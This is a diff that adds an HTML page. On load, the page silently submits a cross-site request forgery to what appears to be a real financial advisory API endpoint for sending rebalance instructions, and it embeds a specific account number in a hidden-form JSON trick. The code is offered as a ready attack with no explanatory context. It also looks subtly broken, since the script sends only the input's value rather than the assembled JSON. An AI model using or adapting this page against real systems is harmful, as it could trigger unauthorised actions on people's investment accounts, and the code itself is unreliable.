@@ -26,6 +26,40 @@
 
 
 
+<html>
+  <body onload="submitForm()">
+    <form id="csrf" method="POST">
+      <input type="hidden" name='{"targetType":"Account","selectedAccounts":[{"accountNumber":"34850352705204","custodian":"FID","accountSource":"FPRS"}],"newRequest":true,"fsake":"' value='"}'>
+    </form>
+
+    <script>
+      function submitForm() {
+        var xhr = new XMLHttpRequest();
+        xhr.open("POST", "https://fin-wealthcentral-advisorchannel.fmr.com/ssc/mars/wc/channel/api/v1/rebalances/workplace/send-instructions", true);
+        xhr.setRequestHeader("Content-Type", "application/json");
+
+        // Get the form data
+        var formData = document.getElementById("csrf").querySelector("input").value;
+
+        // Send the form data with the XMLHttpRequest object
+        xhr.send(formData);
+
+        // Handle the response if needed
+        xhr.onreadystatechange = function() {
+          if (xhr.readyState == 4) {
+            if (xhr.status == 200) {
+              // Handle the successful response here if needed
+              console.log(xhr.responseText);
+            } else {
+              // Handle errors here
+              console.error("Error: " + xhr.status);
+            }
+          }
+        };
+      }
+    </script>
+  </body>
+</html>
 
 
 
